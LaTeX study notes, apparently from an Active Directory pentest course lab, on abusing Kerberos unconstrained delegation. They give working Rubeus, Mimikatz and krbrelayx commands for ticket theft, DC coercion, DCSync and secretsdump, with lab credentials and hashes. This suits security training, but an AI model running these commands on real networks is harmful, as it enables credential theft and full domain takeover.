\section{Unconstrained Delegation}

Recall:
\begin{itemize}
    \item the TGT of the accound authenticating to the account (computer or user) is stored in the TGS.
    \item the TGS is stored in lsass.
\end{itemize}

\subsection{Computer}

\subsubsection{Regular exploit}
waiting for user to authenticate:
\begin{verbatim}
.\Rubeus.exe monitor /interval:5 /nowrap
# Monitor logins and export new tickets
.\Rubeus.exe monitor /targetuser:<username> /interval:10 #Check every 10s for new TGTs

# Export tickets with Mimikatz
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way
\end{verbatim}

Using the Ticket to Request another Ticket:
\begin{verbatim}
Rubeus.exe asktgs /ticket:doIFmTC<SNIP>LkxPQ0FM /service:cifs/dc01.INLANEFREIGHT.local /ptt
Rubeus.exe renew /ticket:doIFmTCCBZWgAwIBBaE<SNIP>LkxPQ0FM /ptt
\end{verbatim}

\subsubsection{Coercing a DC}

Leveraging coercing attack on a DC allow DCSync. Once the DC connect to the compormised computer renew the TGT so that it is loaded then using \verb+mimikatz+ perform dcsync to obtain any hash
\begin{verbatim}
Rubeus.exe renew /ticket:doIFmTCCBZWgAwIBBaE<SNIP>LkxPQ0FM /ptt
mimikatz.exe "lsadump::dcsync /user:sarah.lafferty"
Rubeus.exe asktgt /rc4:0fcb586d2aec31967c8a310d1ac2bf50 /user:sarah.lafferty /ptt
dir \\dc01.inlanefreight.local\c$
\end{verbatim}

\subsection{User}

Prerequisit:
\begin{itemize}
    \item user account with \verb+TRUSTED_FOR_DELEGATION+
    \item \verb+GenericWrite+ on the account (ability to modify \verb+SPN+)
\end{itemize}

Steps:
\begin{itemize}
    \item Create a DNS record
    \item add SPN to the compromised user accound (\verb+CIFS/dns-record+)
\end{itemize}

Toolkit \href{https://github.com/dirkjanm/krbrelayx}{Krbrelayx} which includes:
\begin{itemize}
    \item \verb+addspn.py+
    \item \verb+dnstool.py+
    \item \verb+printerbug.py+
\end{itemize}

DCSync attack with printerbug DC coerce:
\begin{verbatim}
python dnstool.py -u INLANEFREIGHT.LOCAL\\pixis -p p4ssw0rd \
    -r roguecomputer.INLANEFREIGHT.LOCAL \
    -d 10.10.14.2 \
    --action add 10.129.1.207    

python addspn.py -u inlanefreight.local\\pixis -p p4ssw0rd \
    --target-type samname -t sqldev -s CIFS/roguecomputer.inlanefreight.local \
    dc01.inlanefreight.local 

sudo python krbrelayx.py -hashes :cf3a5525ee9414229e66279623ed5c58
sudo python krbrelayx.py -p 'C@lluMDIXON' --interface-ip 10.10.14.37

python dementor.py -u pixis -p p4ssw0rd -d inlanefreight.local \
    roguecomputer.inlanefreight.local dc01.inlanefreight.local

# DCSYNC
export KRB5CCNAME=./DC01\$@INLANEFREIGHT.LOCAL_krbtgt@INLANEFREIGHT.LOCAL.ccache
secretsdump.py -k -no-pass dc01.inlanefreight.local
\end{verbatim}


\subsection{links}
\begin{itemize}
    \item 
        \url{https://www.hackingarticles.in/domain-escalation-unconstrained-delegation/}
    \item 
        \url{https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html#unconstrained-delegation}
    \item 
        \url{https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/unconstrained-delegation}
\end{itemize}

